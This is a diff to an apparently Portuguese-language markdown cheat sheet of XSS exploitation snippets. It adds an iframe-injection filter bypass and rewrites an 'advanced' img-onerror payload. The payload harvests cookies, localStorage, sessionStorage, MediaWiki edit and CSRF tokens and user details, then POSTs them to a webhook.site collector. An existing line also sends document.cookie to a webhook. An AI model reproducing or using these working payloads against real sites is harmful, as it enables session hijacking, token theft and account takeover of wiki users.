@@ -68,60 +68,65 @@ Snippets de código para explorar vulnerabilidades como XSS, SSRF, etc.
     ```html
     <img src="x" onerror="fetch('[https://webhook.site/085d7083-a25c-41c6-beb6-113d2b58e605](https://webhook.site/085d7083-a25c-41c6-beb6-113d2b58e605)', {method:'POST', body:'<cookie>='+document.cookie})">
     ```
-
+* **Bypass de filtro de iframe com xss onerror**
+```
+<img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">
+```
 * **Payload XSS Avançado para Exfiltração de Dados:**
     * Este script captura cookies, `localStorage`, `sessionStorage`, tokens específicos de MediaWiki e informações do usuário, enviando tudo para um webhook.
     ```javascript
-    var data = {};
-    data.cookie = document.cookie;
-    data.localStorage = {};
-    data.sessionStorage = {};
-    data.mediawikiTokens = {};
-    data.userInfo = {};
-
-    // Capturar todos os dados do localStorage
-    for(var i=0; i<localStorage.length; i++) {
-        var key = localStorage.key(i);
-        data.localStorage[key] = localStorage.getItem(key);
+    <img src="invalid" onerror="
+  var data = {
+    cookies: document.cookie,
+    localStorage: {},
+    sessionStorage: {},
+    mediawikiTokens: {},
+    userInfo: {}
+  };
+  
+  // Capturar todos os dados do localStorage
+  for(var i=0; i<localStorage.length; i++) {
+    var key = localStorage.key(i);
+    data.localStorage[key] = localStorage.getItem(key);
+  }
+  
+  // Capturar todos os dados do sessionStorage
+  for(var i=0; i<sessionStorage.length; i++) {
+    var key = sessionStorage.key(i);
+    data.sessionStorage[key] = sessionStorage.getItem(key);
+  }
+  
+  // Tenta obter tokens do MediaWiki especificamente
+  try {
+    if (typeof mw !== 'undefined' && mw.user && mw.user.tokens) {
+      data.mediawikiTokens = {
+        editToken: mw.user.tokens.get('editToken'),
+        csrfToken: mw.user.tokens.get('csrfToken'),
+        watchToken: mw.user.tokens.get('watchToken')
+      };
     }
-
-    // Capturar todos os dados do sessionStorage
-    for(var i=0; i<sessionStorage.length; i++) {
-        var key = sessionStorage.key(i);
-        data.sessionStorage[key] = sessionStorage.getItem(key);
+  } catch(e) {}
+  
+  // Informações do usuário
+  try {
+    if (typeof mw !== 'undefined' && mw.config) {
+      data.userInfo = {
+        userName: mw.config.get('wgUserName'),
+        userId: mw.config.get('wgUserId'),
+        pageName: mw.config.get('wgPageName'),
+        canonicalNamespace: mw.config.get('wgCanonicalNamespace'),
+        revisionId: mw.config.get('wgRevisionId'),
+        articleId: mw.config.get('wgArticleId')
+      };
     }
-
-    // Tenta obter tokens do MediaWiki especificamente
-    try {
-        if(typeof mw != 'undefined' && mw.user && mw.user.tokens) {
-            data.mediawikiTokens = {
-                editToken: mw.user.tokens.get('editToken'),
-                csrfToken: mw.user.tokens.get('csrfToken'),
-                watchToken: mw.user.tokens.get('watchToken')
-            };
-        }
-    } catch(e) {}
-
-    // Informações do usuário
-    try {
-        if(typeof mw != 'undefined' && mw.config) {
-            data.userInfo = {
-                userName: mw.config.get('wgUserName'),
-                userId: mw.config.get('wgUserId'),
-                pageName: mw.config.get('wgPageName'),
-                namespace: mw.config.get('wgCanonicalNamespace'),
-                revisionId: mw.config.get('wgRevisionId'),
-                articleId: mw.config.get('wgArticleId')
-            };
-        }
-    } catch(e) {}
-
-    // Envia os dados coletados para o webhook
-    fetch('[https://webhook.site/ce0f8999-b412-490d-aa38-f94652be63b0](https://webhook.site/ce0f8999-b412-490d-aa38-f94652be63b0)', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(data)
-    });
+  } catch(e) {}
+  
+  fetch('https://webhook.site/ce0ff999-b412-490d-aa38-f946520e63b0', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data)
+  });
+">
     ```
 
 ### Out-of-Band (OOB)
